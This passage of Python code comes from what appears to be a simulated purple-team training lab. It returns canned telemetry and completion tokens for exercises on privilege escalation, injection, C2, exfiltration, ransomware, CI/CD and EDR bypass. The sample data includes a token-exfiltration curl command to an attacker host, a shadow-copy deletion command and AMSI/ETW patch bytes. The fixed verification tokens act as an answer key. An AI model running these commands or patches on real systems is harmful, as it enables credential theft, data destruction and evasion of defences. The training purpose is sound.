                    "=== CAPSTONE STAGE 5 & 6: THREAT INTELLIGENCE & TRIAGE ===\n"
                    "Attributed Threat Actor: APT-VOLT-VIPER\n"
                    "Data Exfiltration Volume: 2400 MB\n"
                    "Assessed Incident Severity: CRITICAL\n"
                )
            if "--contain" in cmd:
                return (
                    "=== CAPSTONE STAGE 7 & 8: CONTAINMENT & ERADICATION ===\n"
                    "Isolate Host:            DB-PROD-01\n"
                    "Terminate Backdoor PID:  3912\n"
                    "Revoke Credential Token: ST-VOLT-9921\n"
                )
            return "Usage: capstone_investigator.py [--detect | --hunt | --forensics | --intel | --triage | --contain]\n"

        # Purple Team Room 01: Purple Foundations
        if "purple_foundations_tool" in cmd:
            st = get_purple_foundations_state(info.session_id)
            if "--show-scope" in cmd:
                return (
                    '{\n  "exercise_id": "PT-2026-001",\n  "mission": "Validate and improve defensive detection capabilities",\n'
                    '  "collaboration_model": "COLLABORATIVE_PAIRING",\n  "focus_technique": "T1059.001"\n}\n'
                )
            if "--submit-scope" in cmd:
                st["scope_approved"] = True
                return '{\n  "status": "PURPLE_SCOPE_APPROVED",\n  "exercise_id": "PT-2026-001",\n  "message": "Scope approved"\n}\n'
            if "--map-telemetry" in cmd:
                if not st.get("scope_approved"):
                    return '{"status": "REJECTED", "message": "Scope must be approved first"}\n'
                st["telemetry_mapped"] = True
                return '{\n  "status": "PURPLE_TELEMETRY_MAP_VERIFIED",\n  "verification_token": "PURPLE_TELEMETRY_MAP_VERIFIED"\n}\n\n[+] Verification Token: PURPLE_TELEMETRY_MAP_VERIFIED\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("scope_approved") and st.get("telemetry_mapped")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["foundations_verified"] = True
                return '{\n  "status": "PURPLE_FOUNDATIONS_EXERCISE_APPROVED",\n  "verification_token": "PURPLE_FOUNDATIONS_EXERCISE_APPROVED"\n}\n\n[+] Verification Token: PURPLE_FOUNDATIONS_EXERCISE_APPROVED\n'
            return "Usage: purple_foundations_tool.py [--show-scope | --submit-scope | --map-telemetry | --finalize]\n"

        # Purple Team Room 02: ATT&CK Mapping
        if "attck_mapping_tool" in cmd:
            st = get_purple_attck_state(info.session_id)
            if "--show-evidence" in cmd:
                st["evidence_retrieved"] = True
                return (
                    "=== EVIDENCE ARTIFACT 1: AUTHENTICATION (KERBEROS) ===\n"
                    "Technique: T1558.003 - Kerberoasting\n\n"
                    "=== EVIDENCE ARTIFACT 2: PERSISTENCE (REGISTRY) ===\n"
                    "Technique: T1547.001 - Registry Run Keys\n"
                )
            if "--map-evidence" in cmd:
                st["evidence_retrieved"] = True
                st["evidence_mapped"] = True
                return '{\n  "status": "ATTCK_EVIDENCE_MAPPING_VERIFIED",\n  "verification_token": "ATTCK_EVIDENCE_MAPPING_VERIFIED"\n}\n\n[+] Verification Token: ATTCK_EVIDENCE_MAPPING_VERIFIED\n'
            if "--challenge" in cmd or "--finalize" in cmd:
                if not st.get("evidence_mapped"):
                    return '{"status": "REJECTED", "message": "Evidence mapping required first"}\n'
                st["attck_verified"] = True
                return '{\n  "status": "ATTCK_LIFECYCLE_MAPPING_COMPLETE",\n  "verification_token": "ATTCK_LIFECYCLE_MAPPING_COMPLETE"\n}\n\n[+] Verification Token: ATTCK_LIFECYCLE_MAPPING_COMPLETE\n'
            return "Usage: attck_mapping_tool.py [--show-evidence | --map-evidence | --challenge]\n"

        # Purple Team Room 03: Attack Simulation Planning
        if "simulation_planner" in cmd:
            st = get_purple_simulation_state(info.session_id)
            if "--view-spec" in cmd:
                return (
                    '{\n  "simulation_id": "SIM-2026-ALPHA",\n  "target_ip": "10.10.14.90",\n'
                    '  "governance": {"framework": "Rules of Engagement", "rollback_objective": "To prevent leaving systems in an insecure state"}\n}\n'
                )
            if "--validate-scope" in cmd:
                st["scope_validated"] = True
                return '{\n  "status": "SIMULATION_SCOPE_VALIDATED",\n  "target_ip": "10.10.14.90"\n}\n'
            if "--register-step" in cmd:
                if not st.get("scope_validated"):
                    return '{"status": "REJECTED", "message": "Scope must be validated first"}\n'
                st["step_registered"] = True
                return '{\n  "status": "SIMULATION_STEP_REGISTERED",\n  "verification_token": "SIMULATION_STEP_REGISTERED"\n}\n\n[+] Verification Token: SIMULATION_STEP_REGISTERED\n'
            if "--approve-plan" in cmd or "--challenge" in cmd:
                if not (st.get("scope_validated") and st.get("step_registered")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["simulation_approved"] = True
                return '{\n  "status": "ATTACK_SIMULATION_PLAN_APPROVED",\n  "verification_token": "ATTACK_SIMULATION_PLAN_APPROVED"\n}\n\n[+] Verification Token: ATTACK_SIMULATION_PLAN_APPROVED\n'
            return "Usage: simulation_planner.py [--view-spec | --validate-scope | --register-step | --approve-plan]\n"

        # Purple Team Room 04: Recon vs Monitoring
        if "recon_correlator" in cmd:
            st = get_purple_recon_state(info.session_id)
            if "--show-scan" in cmd:
                return "# Nmap 7.94 scan report for 10.10.14.90\nPORT 8094/tcp open unknown-recon-target\nScan Type: TCP SYN Stealth Scan (-sS)\n"
            if "--show-alerts" in cmd:
                return "[*] Alert: PORT_SCAN_DETECTED (HIGH_CONFIDENCE) | Targeted Port: 8094\n"
            if "--correlate" in cmd:
                st["correlation_confirmed"] = True
                return '{\n  "status": "RECON_MONITORING_CORRELATION_CONFIRMED",\n  "verification_token": "RECON_MONITORING_CORRELATION_CONFIRMED"\n}\n\n[+] Verification Token: RECON_MONITORING_CORRELATION_CONFIRMED\n'
            if "--tune-threshold" in cmd:
                st["threshold_tuned"] = True
                return '{\n  "status": "THRESHOLD_TUNED_OK"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("correlation_confirmed") and st.get("threshold_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["recon_validated"] = True
                return '{\n  "status": "RECON_VS_MONITORING_VALIDATED",\n  "verification_token": "RECON_VS_MONITORING_VALIDATED"\n}\n\n[+] Verification Token: RECON_VS_MONITORING_VALIDATED\n'
            return "Usage: recon_correlator.py [--show-scan | --show-alerts | --correlate | --tune-threshold | --finalize]\n"

        # Purple Team Room 05: Privilege Escalation Emulation
        if "privesc_emulation_tool" in cmd:
            st = get_purple_privesc_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {"EventID": 4688, "NewProcessName": "cmd.exe", "ParentProcessName": "fodhelper.exe", "Integrity": "High"}\n'
                    ']\n'
                )
            if "--emulate-uac" in cmd:
                st["uac_emulated"] = True
                return '{\n  "status": "PRIVESC_EMULATION_VERIFIED",\n  "verification_token": "PRIVESC_EMULATION_VERIFIED",\n  "technique": "T1548.002",\n  "integrity": "HIGH_INTEGRITY"\n}\n\n[+] Verification Token: PRIVESC_EMULATION_VERIFIED\n'
            if "--tune-detection" in cmd:
                st["detection_tuned"] = True
                return '{\n  "status": "DETECTION_TUNED_OK",\n  "message": "Privilege escalation detection rule deployed"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("uac_emulated") and st.get("detection_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["privesc_validated"] = True
                return '{\n  "status": "PRIVESC_DETECTION_VALIDATED",\n  "verification_token": "PRIVESC_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: PRIVESC_DETECTION_VALIDATED\n'
            return "Usage: privesc_emulation_tool.py [--show-telemetry | --emulate-uac | --tune-detection | --challenge]\n"

        # Purple Team Room 06: Defense Evasion & Injection Emulation
        if "injection_emulation_tool" in cmd:
            st = get_purple_injection_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {"EventID": 8, "SourceImage": "injector.exe", "TargetImage": "explorer.exe", "StartFunction": "LoadLibraryW"}\n'
                    ']\n'
                )
            if "--emulate-injection" in cmd:
                st["injection_emulated"] = True
                return '{\n  "status": "INJECTION_EMULATION_VERIFIED",\n  "verification_token": "INJECTION_EMULATION_VERIFIED",\n  "technique": "T1055.001"\n}\n\n[+] Verification Token: INJECTION_EMULATION_VERIFIED\n'
            if "--tune-edr" in cmd:
                st["edr_tuned"] = True
                return '{\n  "status": "EDR_TUNED_OK",\n  "message": "EDR behavioral rule updated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("injection_emulated") and st.get("edr_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["defense_evasion_validated"] = True
                return '{\n  "status": "DEFENSE_EVASION_DETECTION_VALIDATED",\n  "verification_token": "DEFENSE_EVASION_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: DEFENSE_EVASION_DETECTION_VALIDATED\n'
            return "Usage: injection_emulation_tool.py [--show-telemetry | --emulate-injection | --tune-edr | --challenge]\n"

        # Purple Team Room 07: Lateral Movement Emulation
        if "lateral_emulation_tool" in cmd:
            st = get_purple_lateral_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {"EventID": 4624, "LogonType": 3, "TargetUserName": "svc_admin", "IpAddress": "10.10.14.10"}\n'
                    ']\n'
                )
            if "--emulate-lateral" in cmd:
                st["lateral_emulated"] = True
                return '{\n  "status": "LATERAL_EMULATION_VERIFIED",\n  "verification_token": "LATERAL_EMULATION_VERIFIED",\n  "protocol": "WMI",\n  "logon_type": 3\n}\n\n[+] Verification Token: LATERAL_EMULATION_VERIFIED\n'
            if "--tune-rule" in cmd:
                st["rule_tuned"] = True
                return '{\n  "status": "RULE_TUNED_OK",\n  "message": "Correlation rule enabled"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("lateral_emulated") and st.get("rule_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["lateral_validated"] = True
                return '{\n  "status": "LATERAL_MOVEMENT_DETECTION_VALIDATED",\n  "verification_token": "LATERAL_MOVEMENT_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: LATERAL_MOVEMENT_DETECTION_VALIDATED\n'
            return "Usage: lateral_emulation_tool.py [--show-telemetry | --emulate-lateral | --tune-rule | --challenge]\n"

        # Purple Team Room 08: Persistence Emulation
        if "persistence_emulation_tool" in cmd:
            st = get_purple_persist_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {"EventID": 4698, "TaskName": "\\\\Microsoft\\\\Windows\\\\Customer Experience\\\\TelemetryUpdate", "Trigger": "ONLOGON"}\n'
                    ']\n'
                )
            if "--emulate-task" in cmd:
                st["persistence_emulated"] = True
                return '{\n  "status": "PERSISTENCE_EMULATION_VERIFIED",\n  "verification_token": "PERSISTENCE_EMULATION_VERIFIED",\n  "technique": "T1053.005"\n}\n\n[+] Verification Token: PERSISTENCE_EMULATION_VERIFIED\n'
            if "--remediate" in cmd:
                st["task_remediated"] = True
                return '{\n  "status": "TASK_REMEDIATED_OK",\n  "message": "Scheduled task eradicated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("persistence_emulated") and st.get("task_remediated")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["persistence_validated"] = True
                return '{\n  "status": "PERSISTENCE_REMEDIATION_VALIDATED",\n  "verification_token": "PERSISTENCE_REMEDIATION_VALIDATED"\n}\n\n[+] Verification Token: PERSISTENCE_REMEDIATION_VALIDATED\n'
            return "Usage: persistence_emulation_tool.py [--show-telemetry | --emulate-task | --remediate | --challenge]\n"

        # Purple Team Room 09: C2 Traffic Emulation
        if "c2_emulation_tool" in cmd:
            st = get_purple_c2_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:00:15Z",\n'
                    '    "src_ip": "10.10.14.10",\n'
                    '    "dst_ip": "10.10.14.90",\n'
                    '    "dst_port": 8309,\n'
                    '    "method": "POST",\n'
                    '    "uri": "/api/v1/ping",\n'
                    '    "interval_seconds": 15,\n'
                    '    "jitter_pct": 20,\n'
                    '    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-beacon" in cmd:
                st["c2_emulated"] = True
                return '{\n  "status": "C2_BEACON_EMULATION_VERIFIED",\n  "verification_token": "C2_BEACON_EMULATION_VERIFIED",\n  "technique": "T1071.001"\n}\n\n[+] Verification Token: C2_BEACON_EMULATION_VERIFIED\n'
            if "--tune-detection" in cmd:
                st["detection_tuned"] = True
                return '{\n  "status": "DETECTION_TUNED_OK",\n  "message": "C2 beacon statistical variance detection rule deployed"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("c2_emulated") and st.get("detection_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["c2_validated"] = True
                return '{\n  "status": "C2_DETECTION_VALIDATED",\n  "verification_token": "C2_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: C2_DETECTION_VALIDATED\n'
            return "Usage: c2_emulation_tool.py [--show-telemetry | --emulate-beacon | --tune-detection | --challenge]\n"

        # Purple Team Room 10: Data Exfiltration Emulation
        if "exfil_emulation_tool" in cmd:
            st = get_purple_exfil_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:10:02Z",\n'
                    '    "action": "STAGE_ARCHIVE",\n'
                    '    "staging_path": "/tmp/.staging_vault/db_export.7z",\n'
                    '    "file_count": 14,\n'
                    '    "archive_size_bytes": 48200000,\n'
                    '    "technique": "T1560.001"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-exfil" in cmd:
                st["exfil_emulated"] = True
                return '{\n  "status": "EXFILTRATION_EMULATION_VERIFIED",\n  "verification_token": "EXFILTRATION_EMULATION_VERIFIED",\n  "technique": "T1560.001"\n}\n\n[+] Verification Token: EXFILTRATION_EMULATION_VERIFIED\n'
            if "--tune-dlp" in cmd:
                st["dlp_tuned"] = True
                return '{\n  "status": "DLP_TUNED_OK",\n  "message": "DLP volume threshold rule deployed"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("exfil_emulated") and st.get("dlp_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["exfil_validated"] = True
                return '{\n  "status": "EXFILTRATION_DETECTION_VALIDATED",\n  "verification_token": "EXFILTRATION_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: EXFILTRATION_DETECTION_VALIDATED\n'
            return "Usage: exfil_emulation_tool.py [--show-telemetry | --emulate-exfil | --tune-dlp | --challenge]\n"

        # Purple Team Room 11: Ransomware Attack Emulation & Readiness
        if "ransomware_emulation_tool" in cmd:
            st = get_purple_ransomware_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:20:11Z",\n'
                    '    "process_name": "vssadmin.exe",\n'
                    '    "command_line": "vssadmin delete shadows /all /quiet",\n'
                    '    "technique": "T1490"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-precursors" in cmd:
                st["ransomware_emulated"] = True
                return '{\n  "status": "RANSOMWARE_EMULATION_VERIFIED",\n  "verification_token": "RANSOMWARE_EMULATION_VERIFIED",\n  "technique": "T1490"\n}\n\n[+] Verification Token: RANSOMWARE_EMULATION_VERIFIED\n'
            if "--tune-canary" in cmd:
                st["canary_tuned"] = True
                return '{\n  "status": "CANARY_TUNED_OK",\n  "message": "Canary tripwire detection rule deployed"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("ransomware_emulated") and st.get("canary_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["ransomware_validated"] = True
                return '{\n  "status": "RANSOMWARE_READINESS_VALIDATED",\n  "verification_token": "RANSOMWARE_READINESS_VALIDATED"\n}\n\n[+] Verification Token: RANSOMWARE_READINESS_VALIDATED\n'
            return "Usage: ransomware_emulation_tool.py [--show-telemetry | --emulate-precursors | --tune-canary | --challenge]\n"

        # Purple Team Room 12: Cloud Identity & IAM Privilege Escalation
        if "cloud_iam_emulation_tool" in cmd:
            st = get_purple_cloud_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:30:11Z",\n'
                    '    "event_name": "AssumeRole",\n'
                    '    "roleArn": "arn:aws:iam::123456789012:role/ProdSecOpsAdminRole",\n'
                    '    "technique": "T1552.005"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-assume-role" in cmd:
                st["cloud_iam_emulated"] = True
                return '{\n  "status": "CLOUD_IAM_EMULATION_VERIFIED",\n  "verification_token": "CLOUD_IAM_EMULATION_VERIFIED",\n  "technique": "T1552.005"\n}\n\n[+] Verification Token: CLOUD_IAM_EMULATION_VERIFIED\n'
            if "--tune-pipeline" in cmd:
                st["pipeline_tuned"] = True
                return '{\n  "status": "PIPELINE_TUNED_OK",\n  "message": "CloudTrail anomaly detection alert pipeline deployed"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("cloud_iam_emulated") and st.get("pipeline_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["cloud_validated"] = True
                return '{\n  "status": "CLOUD_IDENTITY_DETECTION_VALIDATED",\n  "verification_token": "CLOUD_IDENTITY_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: CLOUD_IDENTITY_DETECTION_VALIDATED\n'
            return "Usage: cloud_iam_emulation_tool.py [--show-telemetry | --emulate-assume-role | --tune-pipeline | --challenge]\n"

        # Purple Team Room 13: Supply Chain & Dependency Confusion Emulation
        if "supply_chain_tool" in cmd:
            st = get_purple_supply_chain_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:40:02Z",\n'
                    '    "package_manager": "pip",\n'
                    '    "requested_package": "voltcorp-auth-core",\n'
                    '    "resolved_version": "99.0.0",\n'
                    '    "resolved_source": "https://pypi.org/simple/voltcorp-auth-core/",\n'
                    '    "internal_source": "https://pypi.voltcorp.internal/simple/",\n'
                    '    "alert": "UNPINNED_INTERNAL_PACKAGE_RESOLUTION_FROM_PUBLIC_INDEX",\n'
                    '    "technique": "T1195.001"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-confusion" in cmd:
                st["confusion_emulated"] = True
                return '{\n  "status": "SUPPLY_CHAIN_EMULATION_VERIFIED",\n  "verification_token": "SUPPLY_CHAIN_EMULATION_VERIFIED",\n  "technique": "T1195.001"\n}\n\n[+] Verification Token: SUPPLY_CHAIN_EMULATION_VERIFIED\n'
            if "--tune-pinning" in cmd:
                st["pinning_tuned"] = True
                return '{\n  "status": "INTERNAL_PINNING_POLICY_ENFORCED",\n  "message": "Package index order pinned to internal repository"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("confusion_emulated") and st.get("pinning_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["supply_chain_validated"] = True
                return '{\n  "status": "SUPPLY_CHAIN_DETECTION_VALIDATED",\n  "verification_token": "SUPPLY_CHAIN_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: SUPPLY_CHAIN_DETECTION_VALIDATED\n'
            return "Usage: supply_chain_tool.py [--show-telemetry | --emulate-confusion | --tune-pinning | --challenge]\n"

        # Purple Team Room 14: API Security & Broken Object Level Auth (BOLA) Emulation
        if "api_abuse_tool" in cmd:
            st = get_purple_api_abuse_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:45:15Z",\n'
                    '    "method": "GET",\n'
                    '    "path": "/api/v2/users/usr-90124/profile",\n'
                    '    "authenticated_user": "usr-10442",\n'
                    '    "target_resource_owner": "usr-90124",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "python-requests/2.31.0",\n'
                    '    "alert": "UNAUTHORIZED_OBJECT_ID_TRAVERSAL",\n'
                    '    "technique": "T1595.002"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-bola" in cmd:
                st["bola_emulated"] = True
                return '{\n  "status": "BOLA_EMULATION_VERIFIED",\n  "verification_token": "BOLA_EMULATION_VERIFIED",\n  "technique": "T1595.002"\n}\n\n[+] Verification Token: BOLA_EMULATION_VERIFIED\n'
            if "--tune-gateway" in cmd:
                st["gateway_tuned"] = True
                return '{\n  "status": "OBJECT_LEVEL_AUTHZ_ENFORCED",\n  "message": "Gateway object level authorization filter activated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("bola_emulated") and st.get("gateway_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["api_abuse_validated"] = True
                return '{\n  "status": "API_ABUSE_DETECTION_VALIDATED",\n  "verification_token": "API_ABUSE_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: API_ABUSE_DETECTION_VALIDATED\n'
            return "Usage: api_abuse_tool.py [--show-telemetry | --emulate-bola | --tune-gateway | --challenge]\n"

        # Purple Team Room 15: Active Directory Attacks Emulation (Kerberoasting)
        if "ad_attacks_tool" in cmd:
            st = get_purple_ad_attacks_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:50:22Z",\n'
                    '    "event_id": 4769,\n'
                    '    "service_name": "MSSQLSvc/db01.corp.internal:1433",\n'
                    '    "service_sid": "S-1-5-21-204123567-109238472-83746123-1105",\n'
                    '    "ticket_encryption_type": "0x17",\n'
                    '    "ticket_options": "0x40810000",\n'
                    '    "target_domain_name": "CORP.INTERNAL",\n'
                    '    "client_address": "10.10.14.10",\n'
                    '    "alert": "POTENTIAL_KERBEROASTING_RC4_TICKET_REQUESTED",\n'
                    '    "technique": "T1558.003"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-kerberoast" in cmd:
                st["kerberoast_emulated"] = True
                return '{\n  "status": "KERBEROASTING_EMULATION_VERIFIED",\n  "verification_token": "KERBEROASTING_EMULATION_VERIFIED",\n  "technique": "T1558.003"\n}\n\n[+] Verification Token: KERBEROASTING_EMULATION_VERIFIED\n'
            if "--tune-dc-rule" in cmd:
                st["dc_rule_tuned"] = True
                return '{\n  "status": "KERBEROS_DETECTION_RULE_ACTIVATED",\n  "message": "Domain controller Kerberos RC4 ticket anomaly rule activated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("kerberoast_emulated") and st.get("dc_rule_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["ad_attack_validated"] = True
                return '{\n  "status": "AD_ATTACK_DETECTION_VALIDATED",\n  "verification_token": "AD_ATTACK_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: AD_ATTACK_DETECTION_VALIDATED\n'
            return "Usage: ad_attacks_tool.py [--show-telemetry | --emulate-kerberoast | --tune-dc-rule | --challenge]\n"

        # Purple Team Room 16: CI/CD Pipeline & GitHub Actions Attack Emulation
        if "cicd_pipeline_tool" in cmd:
            st = get_purple_cicd_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:55:40Z",\n'
                    '    "workflow": "pr-builder.yml",\n'
                    '    "trigger_event": "pull_request_target",\n'
                    '    "sender": "external-contributor-42",\n'
                    '    "injected_command": "curl -X POST https://attacker.c2.internal/exfil --data GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}",\n'
                    '    "runner_os": "ubuntu-latest",\n'
                    '    "alert": "UNTRUSTED_PULL_REQUEST_CONTEXT_INJECTION",\n'
                    '    "technique": "T1195.002"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-pipeline-attack" in cmd:
                st["pipeline_emulated"] = True
                return '{\n  "status": "CICD_PIPELINE_EMULATION_VERIFIED",\n  "verification_token": "CICD_PIPELINE_EMULATION_VERIFIED",\n  "technique": "T1195.002"\n}\n\n[+] Verification Token: CICD_PIPELINE_EMULATION_VERIFIED\n'
            if "--tune-pipeline-audit" in cmd:
                st["pipeline_audit_tuned"] = True
                return '{\n  "status": "CI_PIPELINE_GUARDRAILS_ARMED",\n  "message": "CI/CD pull_request_target validation and GITHUB_TOKEN restriction rule armed"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("pipeline_emulated") and st.get("pipeline_audit_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["cicd_validated"] = True
                return '{\n  "status": "CICD_PIPELINE_DETECTION_VALIDATED",\n  "verification_token": "CICD_PIPELINE_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: CICD_PIPELINE_DETECTION_VALIDATED\n'
            return "Usage: cicd_pipeline_tool.py [--show-telemetry | --emulate-pipeline-attack | --tune-pipeline-audit | --challenge]\n"

        # Purple Team Room 17: EDR Telemetry Blinding & Bypass Emulation
        if "edr_bypass_tool" in cmd:
            st = get_purple_edr_bypass_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T14:10:12Z",\n'
                    '    "event_id": "ETW_PROVIDER_DISABLE",\n'
                    '    "provider_guid": "{802ec45a-1e99-4b83-9920-87c98277ba9d}",\n'
                    '    "process_name": "powershell.exe",\n'
                    '    "pid": 4812,\n'
                    '    "user": "DOMAIN\\\\victim_user",\n'
                    '    "patch_target": "ntdll!EtwEventWrite",\n'
                    '    "opcode": "RET_PATCH_0xC3",\n'
                    '    "alert": "ETW_TI_TAMPERING_DETECTED",\n'
                    '    "technique": "T1562.001"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T14:10:45Z",\n'
                    '    "event_id": "AMSI_BUFFER_PATCH",\n'
                    '    "target_dll": "amsi.dll",\n'
                    '    "target_export": "AmsiScanBuffer",\n'
                    '    "patch_bytes": "B8 57 00 07 80 C3",\n'
                    '    "result": "AMSI_RESULT_CLEAN_FORCE",\n'
                    '    "technique": "T1562.001"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-bypass" in cmd or "--emulate" in cmd:
                st["edr_bypass_emulated"] = True
                return '{\n  "status": "EDR_BYPASS_EMULATION_VERIFIED",\n  "verification_token": "EDR_BYPASS_EMULATION_VERIFIED",\n  "technique": "T1562.001"\n}\n\n[+] Verification Token: EDR_BYPASS_EMULATION_VERIFIED\n'
            if "--tune-etw" in cmd:
                st["etw_tuned"] = True
                return '{\n  "status": "ETW_TUNED_OK",\n  "message": "Kernel ThreatIntelligence-ETW integrity checking activated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("edr_bypass_emulated") and st.get("etw_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["edr_bypass_validated"] = True
                return '{\n  "status": "EDR_BYPASS_DETECTION_VALIDATED",\n  "verification_token": "EDR_BYPASS_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: EDR_BYPASS_DETECTION_VALIDATED\n'
            return "Usage: edr_bypass_tool.py [--show-telemetry | --emulate-bypass | --tune-etw | --challenge]\n"

        # Purple Team Room 18: TTP Heatmap Generation & Coverage Scoring
        if "heatmap_tool" in cmd:
            st = get_purple_heatmap_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "technique_id": "T1059.001",\n'
                    '    "name": "PowerShell",\n'
                    '    "tactic": "Execution",\n'
                    '    "red_emulated": true,\n'
                    '    "blue_detected": true,\n'
                    '    "coverage_score": 100,\n'
                    '    "rule_ids": ["SIGMA-PS-001", "SPLUNK-WIN-POWERSHELL-ENCODED"]\n'
                    '  },\n'
                    '  {\n'
                    '    "technique_id": "T1055.001",\n'
                    '    "name": "Dynamic-link Library Injection",\n'
                    '    "tactic": "Defense Evasion",\n'
                    '    "red_emulated": true,\n'
                    '    "blue_detected": false,\n'
                    '    "coverage_score": 25,\n'
                    '    "gap_note": "Sysmon Event ID 8 missing filter for ntdll injection"\n'
                    '  },\n'
                    '  {\n'
                    '    "technique_id": "T1003.001",\n'
                    '    "name": "LSASS Memory",\n'
                    '    "tactic": "Credential Access",\n'
                    '    "red_emulated": true,\n'
                    '    "blue_detected": true,\n'
                    '    "coverage_score": 90,\n'
                    '    "rule_ids": ["SYSMON-10-LSASS-DUMP"]\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-scoring" in cmd or "--emulate" in cmd:
                st["heatmap_emulated"] = True
                return '{\n  "status": "HEATMAP_EMULATION_VERIFIED",\n  "verification_token": "HEATMAP_EMULATION_VERIFIED",\n  "matrix_layer": "ATT&CK-Navigator-v4.3"\n}\n\n[+] Verification Token: HEATMAP_EMULATION_VERIFIED\n'
            if "--tune-overlay" in cmd:
                st["overlay_tuned"] = True
                return '{\n  "status": "OVERLAY_TUNED_OK",\n  "message": "Enterprise ATT&CK defense overlay tuned and calibrated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("heatmap_emulated") and st.get("overlay_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["heatmap_validated"] = True
                return '{\n  "status": "HEATMAP_COVERAGE_VALIDATED",\n  "verification_token": "HEATMAP_COVERAGE_VALIDATED"\n}\n\n[+] Verification Token: HEATMAP_COVERAGE_VALIDATED\n'
            return "Usage: heatmap_tool.py [--show-telemetry | --emulate-scoring | --tune-overlay | --challenge]\n"

        # Purple Team Room 19: Continuous Security Validation & Automated Testing
        if "continuous_validation_tool" in cmd:
